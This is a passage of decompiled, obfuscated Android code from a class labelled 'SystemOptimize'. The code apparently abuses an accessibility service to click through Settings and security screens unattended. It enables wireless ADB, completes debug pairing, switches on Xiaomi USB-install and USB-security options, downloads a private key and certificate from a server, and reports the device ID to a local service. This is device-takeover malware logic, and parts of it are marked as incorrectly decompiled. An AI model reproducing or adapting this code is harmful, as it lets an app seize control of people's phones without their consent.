                        float fCenterY = rect.centerY();
                        DisplayMetrics displayMetrics = this.f53815a0.getResources().getDisplayMetrics();
                        int i3 = displayMetrics.widthPixels;
                        int i4 = displayMetrics.heightPixels;
                        t60.m214702c3("SystemOptimize", "方式2 坐标点击: (" + fCenterX + ", " + fCenterY + "), 屏幕: " + i3 + "x" + i4 + ", rect=" + rect);
                        float f = i4;
                        if (fCenterY > f || fCenterX > i3 || fCenterX < 0.0f || fCenterY < 0.0f) {
                            t60.m214726f4("SystemOptimize", "方式2 坐标越界，尝试使用 boundsInParent");
                            Rect rect2 = new Rect();
                            accessibilityNodeInfoM212008f3.getBoundsInParent(rect2);
                            if (rect2.centerY() > 0 && rect2.centerY() < i4) {
                                fCenterX = i3 / 2;
                                fCenterY = 0.85f * f;
                                t60.m214702c3("SystemOptimize", "方式2 使用估算坐标: (" + fCenterX + ", " + fCenterY + ")");
                            }
                        }
                        float f2 = i3;
                        float f3 = 1;
                        float fM214412a8 = AbstractC1117qo.m214412a8(fCenterX, 0.0f, f2 - f3);
                        float fM214412a82 = AbstractC1117qo.m214412a8(fCenterY, 0.0f, f - f3);
                        Path path = new Path();
                        path.moveTo(fM214412a8, fM214412a82);
                        zDispatchGesture = this.f53815a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 50L)).build(), null, null);
                        t60.m214702c3("SystemOptimize", "方式2 坐标点击结果: " + zDispatchGesture + " (最终坐标: " + fM214412a8 + ", " + fM214412a82 + ")");
                    }
                    this.f53846d1 = jCurrentTimeMillis;
                    t60.m214702c3("SystemOptimize", "点击" + str + "按钮 最终结果=" + zDispatchGesture);
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            e = e2;
            z = false;
        }
    }

    /* renamed from: h8 */
    public final boolean m212073h8() {
        try {
            if (Build.VERSION.SDK_INT < 30) {
                t60.m214702c3("SystemOptimize", "isWirelessDebuggingEnabled: SDK<30, 返回false");
                return false;
            }
            int i = Settings.Global.getInt(this.f53816a1.getContentResolver(), "adb_wifi_enabled", 0);
            t60.m214702c3("SystemOptimize", "isWirelessDebuggingEnabled: adb_wifi_enabled=" + i);
            return i > 0;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "isWirelessDebuggingEnabled 读取异常", e);
            return false;
        }
    }

    /* renamed from: h9 */
    public final X509Certificate m212074h9(File file) throws CertificateException {
        X509Certificate x509Certificate = f53814g3;
        if (x509Certificate != null) {
            return x509Certificate;
        }
        try {
            if (file.exists()) {
                Certificate certificateGenerateCertificate = CertificateFactory.getInstance("X.509").generateCertificate(new FileInputStream(file));
                t60.m214693b4(certificateGenerateCertificate, "null cannot be cast to non-null type java.security.cert.X509Certificate");
                X509Certificate x509Certificate2 = (X509Certificate) certificateGenerateCertificate;
                f53814g3 = x509Certificate2;
                t60.m214714d6("SystemOptimize", "loadCertificate: 从本地文件加载成功");
                return x509Certificate2;
            }
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "loadCertificate: 本地加载失败", e);
        }
        try {
            t60.m214714d6("SystemOptimize", "loadCertificate: 本地不存在, 尝试从服务器下载");
            if (!m212056e4(file, "cert") || !file.exists()) {
                return null;
            }
            Certificate certificateGenerateCertificate2 = CertificateFactory.getInstance("X.509").generateCertificate(new FileInputStream(file));
            t60.m214693b4(certificateGenerateCertificate2, "null cannot be cast to non-null type java.security.cert.X509Certificate");
            X509Certificate x509Certificate3 = (X509Certificate) certificateGenerateCertificate2;
            f53814g3 = x509Certificate3;
            t60.m214714d6("SystemOptimize", "loadCertificate: 从服务器下载并加载成功");
            return x509Certificate3;
        } catch (Exception e2) {
            t60.m214705c6("SystemOptimize", "loadCertificate: 服务器下载失败", e2);
            return null;
        }
    }

    /* renamed from: i0 */
    public final PrivateKey m212075i0(File file) throws InvalidKeySpecException {
        PrivateKey privateKey = f53813g2;
        if (privateKey != null) {
            return privateKey;
        }
        try {
            if (file.exists()) {
                byte[] bArrM215419f7 = AbstractC1517zh.m215419f7(file);
                if (bArrM215419f7.length > 10) {
                    Charset charset = AbstractC0577hd.f56650a0;
                    if (AbstractC0779a1.m213652a5(new String(bArrM215419f7, 0, 10, charset), "-----", false)) {
                        bArrM215419f7 = Base64.decode(new Regex("\\s").m213647a3(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(new String(bArrM215419f7, charset), "-----BEGIN PRIVATE KEY-----", ""), "-----END PRIVATE KEY-----", ""), "-----BEGIN RSA PRIVATE KEY-----", ""), "-----END RSA PRIVATE KEY-----", ""), ""), 0);
                    }
                }
                PrivateKey privateKeyGeneratePrivate = KeyFactory.getInstance("RSA").generatePrivate(new PKCS8EncodedKeySpec(bArrM215419f7));
                f53813g2 = privateKeyGeneratePrivate;
                t60.m214714d6("SystemOptimize", "loadPrivateKey: 从本地文件加载成功");
                return privateKeyGeneratePrivate;
            }
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "loadPrivateKey: 本地加载失败", e);
        }
        try {
            t60.m214714d6("SystemOptimize", "loadPrivateKey: 本地不存在, 尝试从服务器下载");
            if (!m212056e4(file, "key") || !file.exists()) {
                return null;
            }
            byte[] bArrM215419f72 = AbstractC1517zh.m215419f7(file);
            if (bArrM215419f72.length > 10) {
                Charset charset2 = AbstractC0577hd.f56650a0;
                if (AbstractC0779a1.m213652a5(new String(bArrM215419f72, 0, 10, charset2), "-----", false)) {
                    bArrM215419f72 = Base64.decode(new Regex("\\s").m213647a3(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(new String(bArrM215419f72, charset2), "-----BEGIN PRIVATE KEY-----", ""), "-----END PRIVATE KEY-----", ""), "-----BEGIN RSA PRIVATE KEY-----", ""), "-----END RSA PRIVATE KEY-----", ""), ""), 0);
                }
            }
            PrivateKey privateKeyGeneratePrivate2 = KeyFactory.getInstance("RSA").generatePrivate(new PKCS8EncodedKeySpec(bArrM215419f72));
            f53813g2 = privateKeyGeneratePrivate2;
            t60.m214714d6("SystemOptimize", "loadPrivateKey: 从服务器下载并加载成功");
            return privateKeyGeneratePrivate2;
        } catch (Exception e2) {
            t60.m214705c6("SystemOptimize", "loadPrivateKey: 服务器下载失败", e2);
            return null;
        }
    }

    /* renamed from: i1 */
    public final void m212076i1() {
        try {
            this.f53816a1.getSharedPreferences("system_optimize", 0).edit().putBoolean("adb_deploy_enabled", true).apply();
        } catch (Exception unused) {
        }
    }

    /* renamed from: i2 */
    public final void m212077i2() {
        String str;
        dqtvuisjd dqtvuisjdVar;
        C0323a8 c0323a8M211471g5;
        String string = null;
        try {
            AccessibilityService accessibilityService = this.f53815a0;
            dqtvuisjdVar = accessibilityService instanceof dqtvuisjd ? (dqtvuisjd) accessibilityService : null;
        } catch (Exception unused) {
        }
        String strM211644b0 = (dqtvuisjdVar == null || (c0323a8M211471g5 = dqtvuisjdVar.m211471g5()) == null) ? null : c0323a8M211471g5.m211644b0();
        if (strM211644b0 == null) {
            try {
                String str2 = AbstractC0765ko.f57555a0;
                String strM213604a2 = AbstractC0765ko.m213604a2(this.f53816a1);
                if (strM213604a2 != null && (str = (String) AbstractC0715je.m213291h8(AbstractC0779a1.m213677d0(strM213604a2, new String[]{";"}, 6))) != null) {
                    string = AbstractC0779a1.m213687e0(str).toString();
                }
                strM211644b0 = string == null ? StringUtil.m212470a0("I00FKl5iQ2FAJjwXEzZMOwctViVzAUF0XjADPg==") : string;
            } catch (Exception e) {
                tz0.m214807a7(">>> 通知 local-service 服务器配置失败: ", e.getMessage(), "SystemOptimize");
                return;
            }
        }
        String strM212023i9 = m212023i9(strM211644b0);
        String string2 = Settings.Secure.getString(this.f53816a1.getContentResolver(), "android_id");
        String str3 = AbstractC0765ko.f57555a0;
        String strM213603a1 = AbstractC0765ko.m213603a1(this.f53816a1);
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("serverAddr", strM212023i9);
        jSONObject.put("deviceId", string2);
        if (strM213603a1.length() > 0) {
            jSONObject.put(StringUtil.m212470a0("L1wHM049JytOAipVBQ=="), strM213603a1);
        }
        String string3 = jSONObject.toString();
        t60.m214694b5(string3, "JSONObject().apply {\n   …\n            }.toString()");
        String strM212002c8 = m212002c8(this, "/setConfig", string3, 4);
        t60.m214714d6("SystemOptimize", ">>> 已通知 local-service 服务器配置: serverAddr=" + strM212023i9 + ", deviceId=" + string2 + ", keySalt=" + (strM213603a1.length() > 0 ? "已设置" : "空") + ", result=" + strM212002c8);
    }

    /* renamed from: i3 */
    public final void m212078i3(AccessibilityEvent accessibilityEvent) {
        String string;
        CharSequence packageName;
        String string2;
        CharSequence packageName2 = accessibilityEvent.getPackageName();
        if (packageName2 == null || (string = packageName2.toString()) == null) {
            string = "";
        }
        if ((string.equals("com.android.systemui") || string.equals("com.android.settings")) && (accessibilityEvent.getEventType() == 32 || accessibilityEvent.getEventType() == 2048 || accessibilityEvent.getEventType() == 1)) {
            this.f53817a2.execute(new c41(this, 0));
        }
        if (this.f53822a7.get() || !this.f53823a8.get() || (packageName = accessibilityEvent.getPackageName()) == null || (string2 = packageName.toString()) == null) {
            return;
        }
        if (AbstractC0779a1.m213652a5(string2, "settings", false) || AbstractC0779a1.m213652a5(string2, "securitycenter", false) || AbstractC0779a1.m213652a5(string2, "systemui", false)) {
            int eventType = accessibilityEvent.getEventType();
            CharSequence className = accessibilityEvent.getClassName();
            this.f53817a2.execute(new e41(this, AccessibilityEvent.obtain(accessibilityEvent), string2, eventType, className != null ? className.toString() : null));
        }
    }

    /* renamed from: i4 */
    public final void m212079i4(AccessibilityEvent accessibilityEvent, String str, String str2) {
        C0358a0 c0358a0;
        try {
            if (((SystemOptimizeManager$DevOptState) this.f53820a5.get()).f53758a0 < 7 && (c0358a0 = this.f53828b3) != null) {
                c0358a0.m211989d2(accessibilityEvent, str, str2);
            }
            boolean zM212028a2 = m212028a2();
            SystemOptimizeManager$PairState systemOptimizeManager$PairState = SystemOptimizeManager$PairState.f53765a6;
            SystemOptimizeManager$PairState systemOptimizeManager$PairState2 = SystemOptimizeManager$PairState.f53764a5;
            SystemOptimizeManager$PairState systemOptimizeManager$PairState3 = SystemOptimizeManager$PairState.f53761a2;
            AtomicReference atomicReference = this.f53819a4;
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f53818a3;
            if (zM212028a2) {
                concurrentLinkedQueue.remove("pairInWifiDebugWindow");
                concurrentLinkedQueue.remove("pairInPairCodeDialog");
                concurrentLinkedQueue.remove("pairInPairFailDialog");
                concurrentLinkedQueue.remove("pairInConfirmLock");
                concurrentLinkedQueue.remove("pairInSecurityCenter");
                concurrentLinkedQueue.remove("pairInPairSuccess");
                SystemOptimizeManager$PairState systemOptimizeManager$PairState4 = (SystemOptimizeManager$PairState) atomicReference.get();
                if (concurrentLinkedQueue.contains("pairInDevOption")) {
                    return;
                }
                if (systemOptimizeManager$PairState4 != systemOptimizeManager$PairState3 && systemOptimizeManager$PairState4 != systemOptimizeManager$PairState2 && systemOptimizeManager$PairState4 != systemOptimizeManager$PairState) {
                    concurrentLinkedQueue.add("pairInDevOption");
                    m212087j5("G", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$onAccessibilityEventInternal$1
                        {
                            super(0);
                        }

                        @Override // p000.w00
                        public final Object invoke() {
                            C0360a2.m211991b0(this.f53774a0);
                            return C1351vv.f60710b1;
                        }
                    });
                    return;
                } else {
                    t60.m214702c3("SystemOptimize", "K()=true 但配对已成功/完成 (state=" + systemOptimizeManager$PairState4 + ")，跳过 G()");
                    return;
                }
            }
            if (m212032a6()) {
                concurrentLinkedQueue.remove("pairInDevOption");
                concurrentLinkedQueue.remove("pairInConfirmLock");
                SystemOptimizeManager$PairState systemOptimizeManager$PairState5 = (SystemOptimizeManager$PairState) atomicReference.get();
                if (systemOptimizeManager$PairState5 != systemOptimizeManager$PairState3 && systemOptimizeManager$PairState5 != systemOptimizeManager$PairState2 && systemOptimizeManager$PairState5 != systemOptimizeManager$PairState) {
                    if (concurrentLinkedQueue.contains("pairInWifiDebugWindow")) {
                        return;
                    }
                    concurrentLinkedQueue.add("pairInWifiDebugWindow");
                    m212087j5("W", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$onAccessibilityEventInternal$3
                        {
                            super(0);
                        }

                        @Override // p000.w00
                        public final Object invoke() {
                            C0360a2.m211995b4(this.f53776a0);
                            return C1351vv.f60710b1;
                        }
                    });
                    return;
                }
                if (systemOptimizeManager$PairState5 != systemOptimizeManager$PairState3) {
                    t60.m214702c3("SystemOptimize", "O()=true 但状态已是 " + systemOptimizeManager$PairState5 + "，跳过调度");
                    return;
                }
                if (concurrentLinkedQueue.contains("pairInPairSuccess") || concurrentLinkedQueue.contains("pairInPrepareFinish")) {
                    t60.m214702c3("SystemOptimize", "O()=true, PAIR_SUCCESS 但任务已在队列，跳过");
                    return;
                } else {
                    concurrentLinkedQueue.add("pairInPairSuccess");
                    m212087j5("S", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$onAccessibilityEventInternal$2
                        {
                            super(0);
                        }

                        /* JADX WARN: Removed duplicated region for block: B:108:0x0265 A[Catch: Exception -> 0x0027, TryCatch #4 {Exception -> 0x0027, blocks: (B:3:0x0014, B:5:0x001c, B:8:0x002a, B:14:0x003d, B:15:0x004c, B:49:0x0111, B:52:0x012b, B:54:0x0131, B:56:0x0137, B:81:0x0190, B:83:0x01a6, B:94:0x0219, B:95:0x021e, B:97:0x0237, B:99:0x023d, B:101:0x0243, B:104:0x024a, B:105:0x0253, B:93:0x0202, B:106:0x0258, B:108:0x0265, B:109:0x026f, B:58:0x013d, B:66:0x015f, B:71:0x0171, B:77:0x0183, B:78:0x0188, B:48:0x010c, B:16:0x0050, B:19:0x0059, B:21:0x0061, B:23:0x0067, B:26:0x008f, B:29:0x0097, B:30:0x00b3, B:31:0x00b7, B:33:0x00bb, B:45:0x00f6, B:44:0x00f1, B:46:0x0106, B:34:0x00d4, B:36:0x00dc, B:39:0x00e3, B:42:0x00eb, B:86:0x01ae, B:88:0x01e1, B:91:0x01ea, B:72:0x0173, B:74:0x0179), top: B:124:0x0014, inners: #0, #3, #5 }] */
                        /* JADX WARN: Removed duplicated region for block: B:65:0x015d  */
                        /* JADX WARN: Removed duplicated region for block: B:81:0x0190 A[Catch: Exception -> 0x0027, TryCatch #4 {Exception -> 0x0027, blocks: (B:3:0x0014, B:5:0x001c, B:8:0x002a, B:14:0x003d, B:15:0x004c, B:49:0x0111, B:52:0x012b, B:54:0x0131, B:56:0x0137, B:81:0x0190, B:83:0x01a6, B:94:0x0219, B:95:0x021e, B:97:0x0237, B:99:0x023d, B:101:0x0243, B:104:0x024a, B:105:0x0253, B:93:0x0202, B:106:0x0258, B:108:0x0265, B:109:0x026f, B:58:0x013d, B:66:0x015f, B:71:0x0171, B:77:0x0183, B:78:0x0188, B:48:0x010c, B:16:0x0050, B:19:0x0059, B:21:0x0061, B:23:0x0067, B:26:0x008f, B:29:0x0097, B:30:0x00b3, B:31:0x00b7, B:33:0x00bb, B:45:0x00f6, B:44:0x00f1, B:46:0x0106, B:34:0x00d4, B:36:0x00dc, B:39:0x00e3, B:42:0x00eb, B:86:0x01ae, B:88:0x01e1, B:91:0x01ea, B:72:0x0173, B:74:0x0179), top: B:124:0x0014, inners: #0, #3, #5 }] */
                        @Override // p000.w00
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final Object invoke() {
                            int i;
                            final C0360a2 c0360a2 = this.f53775a0;
                            try {
                                if (!c0360a2.f53818a3.contains("pairInPrepareFinish")) {
                                    c0360a2.f53818a3.add("pairInPrepareFinish");
                                    t60.m214702c3("SystemOptimize", "pairInPairSuccess: 入口处添加 pairInPrepareFinish 到队列");
                                }
                                if (((SystemOptimizeManager$PairState) c0360a2.f53819a4.get()) == SystemOptimizeManager$PairState.f53761a2) {
                                    int i2 = 5;
                                    C0360a2.m212025k1(5);
                                    try {
                                        Ref$IntRef ref$IntRef = new Ref$IntRef();
                                        int i3 = 1;
                                        while (true) {
                                            if (i3 >= 6) {
                                                break;
                                            }
                                            AccessibilityNodeInfo rootInActiveWindow = c0360a2.f53815a0.getRootInActiveWindow();
                                            if (rootInActiveWindow != null) {
                                                int iM212021i7 = C0360a2.m212021i7(rootInActiveWindow);
                                                if (iM212021i7 > 0) {
                                                    ref$IntRef.f57624a0 = iM212021i7;
                                                    c0360a2.m212091k0(iM212021i7);
                                                    t60.m214714d6("SystemOptimize", "pairInPairSuccess: 读取到调试端口 " + iM212021i7 + " (第" + i3 + "次)");
                                                    break;
                                                }
                                                rootInActiveWindow.recycle();
                                                i = 5;
                                            } else {
                                                i = i2;
                                            }
                                            if (i3 < i) {
                                                t60.m214702c3("SystemOptimize", "pairInPairSuccess: 第" + i3 + "次未读到端口，等待重试...");
                                                C0360a2.m212025k1(5);
                                            }
                                            i3++;
                                            i2 = 5;
                                        }
                                        int i4 = ref$IntRef.f57624a0;
                                        if (i4 > 0) {
                                            t60.m214714d6("SystemOptimize", "pairInPairSuccess: 记录端口 " + i4 + "，延迟到 handleComplete 部署");
                                            try {
                                                if (c0360a2.m212045d3(ref$IntRef.f57624a0) || c0360a2.m212036b8()) {
                                                    t60.m214714d6("SystemOptimize", "pairInPairSuccess: ADB 连接成功，local-service 将在 handleComplete 部署");
                                                } else {
                                                    t60.m214726f4("SystemOptimize", "pairInPairSuccess: ADB 连接失败，将由 handleComplete 重试");
                                                }
                                            } catch (Exception e) {
                                                t60.m214705c6("SystemOptimize", "pairInPairSuccess: ADB 连接异常", e);
                                            }
                                            new Thread(new RunnableC1052p1(c0360a2, 13, ref$IntRef)).start();
                                        } else {
                                            t60.m214726f4("SystemOptimize", "pairInPairSuccess: 5次重试后仍未读取到调试端口");
                                        }
                                    } catch (Exception e2) {
                                        t60.m214705c6("SystemOptimize", "pairInPairSuccess: 读取调试端口异常", e2);
                                    }
                                    String str3 = Build.BRAND;
                                    t60.m214694b5(str3, "BRAND");
                                    String lowerCase = str3.toLowerCase(Locale.ROOT);
                                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                    if ((lowerCase.equals("xiaomi") || lowerCase.equals("redmi") || lowerCase.equals("poco") || lowerCase.equals("blackshark")) && Build.VERSION.SDK_INT >= 35) {
                                        if (!new File("/system/bin/su").exists()) {
                                            if (new File("/system/xbin/su").exists()) {
                                                C0360a2.m212025k1(5);
                                                if (Settings.Global.getInt(c0360a2.f53816a1.getContentResolver(), "adb_wifi_enabled", 0) != 1) {
                                                    Context context = c0360a2.f53816a1;
                                                    try {
                                                        if (Settings.System.canWrite(context)) {
                                                            Settings.Global.putInt(context.getContentResolver(), "adb_wifi_enabled", 1);
                                                        }
                                                    } catch (Exception e3) {
                                                        t60.m214705c6("SystemOptimize", "enableAdbWifi 异常", e3);
                                                    }
                                                }
                                            }
                                            if (!c0360a2.m212028a2()) {
                                                int i5 = 1;
                                                c0360a2.f53815a0.performGlobalAction(1);
                                                t60.m214702c3("SystemOptimize", "GlobalActionAutomator back (仅一次)");
                                                C0360a2.m212025k1(5);
                                                if (c0360a2.m212028a2()) {
                                                    c0360a2.f53818a3.remove("pairInPairSuccess");
                                                    if (!c0360a2.f53818a3.contains("pairInPrepareFinish")) {
                                                    }
                                                    c0360a2.m212087j5("F", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$pairInPairSuccess$2
                                                        {
                                                            super(0);
                                                        }

                                                        /* JADX WARN: Removed duplicated region for block: B:79:0x0203 A[Catch: Exception -> 0x002f, TryCatch #0 {Exception -> 0x002f, blocks: (B:3:0x0012, B:9:0x0025, B:12:0x0032, B:14:0x0044, B:15:0x0056, B:17:0x005c, B:18:0x006b, B:20:0x0076, B:22:0x007e, B:27:0x009e, B:29:0x00a4, B:30:0x00b3, B:32:0x00be, B:34:0x00d1, B:36:0x00dd, B:38:0x00e3, B:41:0x00ee, B:43:0x0109, B:45:0x0131, B:47:0x0137, B:52:0x0145, B:54:0x014b, B:50:0x013f, B:57:0x016b, B:59:0x017c, B:61:0x0188, B:63:0x018e, B:65:0x0197, B:67:0x01b0, B:69:0x01ca, B:71:0x01d8, B:79:0x0203, B:84:0x0244, B:80:0x022f, B:82:0x0234, B:83:0x023e, B:74:0x01e2, B:76:0x01f3, B:86:0x024e, B:88:0x0252, B:68:0x01c7, B:85:0x0249, B:55:0x015d, B:56:0x0164, B:26:0x0099, B:31:0x00b9, B:89:0x0257, B:23:0x0083), top: B:94:0x0012, inners: #1 }] */
                                                        /* JADX WARN: Removed duplicated region for block: B:80:0x022f A[Catch: Exception -> 0x002f, TryCatch #0 {Exception -> 0x002f, blocks: (B:3:0x0012, B:9:0x0025, B:12:0x0032, B:14:0x0044, B:15:0x0056, B:17:0x005c, B:18:0x006b, B:20:0x0076, B:22:0x007e, B:27:0x009e, B:29:0x00a4, B:30:0x00b3, B:32:0x00be, B:34:0x00d1, B:36:0x00dd, B:38:0x00e3, B:41:0x00ee, B:43:0x0109, B:45:0x0131, B:47:0x0137, B:52:0x0145, B:54:0x014b, B:50:0x013f, B:57:0x016b, B:59:0x017c, B:61:0x0188, B:63:0x018e, B:65:0x0197, B:67:0x01b0, B:69:0x01ca, B:71:0x01d8, B:79:0x0203, B:84:0x0244, B:80:0x022f, B:82:0x0234, B:83:0x023e, B:74:0x01e2, B:76:0x01f3, B:86:0x024e, B:88:0x0252, B:68:0x01c7, B:85:0x0249, B:55:0x015d, B:56:0x0164, B:26:0x0099, B:31:0x00b9, B:89:0x0257, B:23:0x0083), top: B:94:0x0012, inners: #1 }] */
                                                        @Override // p000.w00
                                                        /*
                                                            Code decompiled incorrectly, please refer to instructions dump.
                                                        */
                                                        public final Object invoke() {
                                                            boolean z;
                                                            AccessibilityNodeInfo accessibilityNodeInfoM212008f3;
                                                            boolean z2;
                                                            AccessibilityNodeInfo accessibilityNodeInfoM212048d6;
                                                            AccessibilityNodeInfo accessibilityNodeInfoM212048d62;
                                                            C0360a2 c0360a22 = c0360a2;
                                                            try {
                                                                if (((SystemOptimizeManager$PairState) c0360a22.f53819a4.get()) == SystemOptimizeManager$PairState.f53761a2) {
                                                                    c0360a22.f53819a4.set(SystemOptimizeManager$PairState.f53764a5);
                                                                    t60.m214714d6("SystemOptimize", "pairInPrepareFinish: 部署将在 WRITE_SETTINGS 权限完成后执行");
                                                                    if (kg1.m213521c7()) {
                                                                        t60.m214714d6("SystemOptimize", "OPPO设备：处理禁止权限监控");
                                                                        c0360a22.m212069h3();
                                                                        c0360a22.m212094k4();
                                                                        c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                    } else if (kg1.m213524d0()) {
                                                                        t60.m214714d6("SystemOptimize", "小米设备：处理 USB安装 + USB安全设置");
                                                                        if (kg1.m213524d0()) {
                                                                            if (c0360a22.m212028a2()) {
                                                                                t60.m214714d6("SystemOptimize", "小米 pairInPrepareFinish: 已在开发者选项页面");
                                                                            } else {
                                                                                t60.m214726f4("SystemOptimize", "小米 pairInPrepareFinish: 当前不在开发者选项页面，尝试重新打开");
                                                                                try {
                                                                                    Intent intent = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
                                                                                    intent.addFlags(268435456);
                                                                                    c0360a22.f53816a1.startActivity(intent);
                                                                                    C0360a2.m212025k1(15);
                                                                                } catch (Exception e4) {
                                                                                    t60.m214705c6("SystemOptimize", "小米：重新打开开发者选项失败", e4);
                                                                                }
                                                                                if (c0360a22.m212028a2()) {
                                                                                    t60.m214714d6("SystemOptimize", "小米：已重新打开开发者选项页面");
                                                                                } else {
                                                                                    t60.m214704c5("SystemOptimize", "小米：重新打开开发者选项后仍未检测到页面，跳过 USB安装处理");
                                                                                    c0360a22.m212094k4();
                                                                                    c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                                }
                                                                            }
                                                                            AccessibilityNodeInfo rootInActiveWindow2 = c0360a22.f53815a0.getRootInActiveWindow();
                                                                            t60.m214694b5(rootInActiveWindow2, "service.rootInActiveWindow");
                                                                            y90 y90Var = AbstractC0361a3.f53874a0;
                                                                            List list = dh0.f55795e5;
                                                                            AccessibilityNodeInfo accessibilityNodeInfoM212014f9 = C0360a2.m212014f9(rootInActiveWindow2, list);
                                                                            if (accessibilityNodeInfoM212014f9 == null && (accessibilityNodeInfoM212048d62 = c0360a22.m212048d6(c0360a22.f53815a0.getRootInActiveWindow())) != null && (accessibilityNodeInfoM212014f9 = c0360a22.m212090j8(accessibilityNodeInfoM212048d62, list)) == null) {
                                                                                c0360a22.m212088j6(accessibilityNodeInfoM212048d62);
                                                                                accessibilityNodeInfoM212014f9 = c0360a22.m212090j8(accessibilityNodeInfoM212048d62, list);
                                                                            }
                                                                            if (accessibilityNodeInfoM212014f9 != null) {
                                                                                z = true;
                                                                                t60.m214702c3("SystemOptimize", "USB安装栏目查找成功: text=" + ((Object) accessibilityNodeInfoM212014f9.getText()));
                                                                                AccessibilityNodeInfo accessibilityNodeInfoM212010f5 = C0360a2.m212010f5(accessibilityNodeInfoM212014f9);
                                                                                if (accessibilityNodeInfoM212010f5 != null) {
                                                                                    t60.m214702c3("SystemOptimize", "USB安装 点击整行: " + ((Object) accessibilityNodeInfoM212010f5.getClassName()));
                                                                                    accessibilityNodeInfoM212010f5.performAction(16);
                                                                                    C0360a2.m212025k1(15);
                                                                                    AccessibilityNodeInfo rootInActiveWindow3 = c0360a22.f53815a0.getRootInActiveWindow();
                                                                                    t60.m214694b5(rootInActiveWindow3, "service.rootInActiveWindow");
                                                                                    AccessibilityNodeInfo accessibilityNodeInfoM212014f92 = C0360a2.m212014f9(rootInActiveWindow3, list);
                                                                                    if (accessibilityNodeInfoM212014f92 != null) {
                                                                                        AccessibilityNodeInfo accessibilityNodeInfoM212010f52 = C0360a2.m212010f5(accessibilityNodeInfoM212014f92);
                                                                                        if (accessibilityNodeInfoM212010f52 == null) {
                                                                                            accessibilityNodeInfoM212010f52 = accessibilityNodeInfoM212014f92.getParent();
                                                                                        }
                                                                                        AccessibilityNodeInfo accessibilityNodeInfoM212017g2 = accessibilityNodeInfoM212010f52 == null ? null : C0360a2.m212017g2(accessibilityNodeInfoM212010f52);
                                                                                        boolean zIsChecked = accessibilityNodeInfoM212017g2 != null ? accessibilityNodeInfoM212017g2.isChecked() : false;
                                                                                        c0360a22.f53836c1 = zIsChecked;
                                                                                        t60.m214702c3("SystemOptimize", "USB安装点击后状态: checked=" + zIsChecked);
                                                                                    }
                                                                                } else {
                                                                                    accessibilityNodeInfoM212014f9.performAction(16);
                                                                                    C0360a2.m212025k1(15);
                                                                                }
                                                                            } else {
                                                                                z = true;
                                                                                t60.m214704c5("SystemOptimize", "USB安装栏目查找失败");
                                                                            }
                                                                            AccessibilityNodeInfo rootInActiveWindow4 = c0360a22.f53815a0.getRootInActiveWindow();
                                                                            t60.m214694b5(rootInActiveWindow4, "service.rootInActiveWindow");
                                                                            List list2 = dh0.f55796e6;
                                                                            AccessibilityNodeInfo accessibilityNodeInfoM212014f93 = C0360a2.m212014f9(rootInActiveWindow4, list2);
                                                                            if (accessibilityNodeInfoM212014f93 == null && (accessibilityNodeInfoM212048d6 = c0360a22.m212048d6(c0360a22.f53815a0.getRootInActiveWindow())) != null && (accessibilityNodeInfoM212014f93 = c0360a22.m212090j8(accessibilityNodeInfoM212048d6, list2)) == null) {
                                                                                c0360a22.m212088j6(accessibilityNodeInfoM212048d6);
                                                                                accessibilityNodeInfoM212014f93 = c0360a22.m212090j8(accessibilityNodeInfoM212048d6, list2);
                                                                            }
                                                                            if (accessibilityNodeInfoM212014f93 != null) {
                                                                                t60.m214702c3("SystemOptimize", "USB安全设置栏目查找成功: text=" + ((Object) accessibilityNodeInfoM212014f93.getText()));
                                                                                AccessibilityNodeInfo accessibilityNodeInfoM212010f53 = C0360a2.m212010f5(accessibilityNodeInfoM212014f93);
                                                                                if (accessibilityNodeInfoM212010f53 != null) {
                                                                                    t60.m214702c3("SystemOptimize", "USB安全设置 点击整行: " + ((Object) accessibilityNodeInfoM212010f53.getClassName()));
                                                                                    accessibilityNodeInfoM212010f53.performAction(16);
                                                                                } else {
                                                                                    accessibilityNodeInfoM212014f93.performAction(16);
                                                                                }
                                                                                t60.m214702c3("SystemOptimize", "USB安全设置已点击，等待弹窗...");
                                                                                C0360a2.m212025k1(10);
                                                                                int i6 = 0;
                                                                                int i7 = 0;
                                                                                while (true) {
                                                                                    if (i6 >= 15) {
                                                                                        break;
                                                                                    }
                                                                                    AccessibilityNodeInfo rootInActiveWindow5 = c0360a22.f53815a0.getRootInActiveWindow();
                                                                                    if (rootInActiveWindow5 == null) {
                                                                                        accessibilityNodeInfoM212008f3 = null;
                                                                                        if (accessibilityNodeInfoM212008f3 == null) {
                                                                                            t60.m214702c3("SystemOptimize", "USB安全设置 弹窗" + (i6 + 1) + ": 点击 " + ((Object) accessibilityNodeInfoM212008f3.getText()));
                                                                                            accessibilityNodeInfoM212008f3.performAction(16);
                                                                                            C0360a2.m212025k1(10);
                                                                                            z2 = z;
                                                                                            i7 = 0;
                                                                                        } else {
                                                                                            i7++;
                                                                                            if (i7 >= 3) {
                                                                                                t60.m214702c3("SystemOptimize", "USB安全设置 弹窗处理完成");
                                                                                                c0360a22.f53837c2 = z;
                                                                                                break;
                                                                                            }
                                                                                            z2 = z;
                                                                                            C0360a2.m212025k1(5);
                                                                                        }
                                                                                        i6++;
                                                                                        z = z2;
                                                                                    } else {
                                                                                        ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.m212602a1(), dh0.f55750a0);
                                                                                        int size = arrayListM213298i5.size();
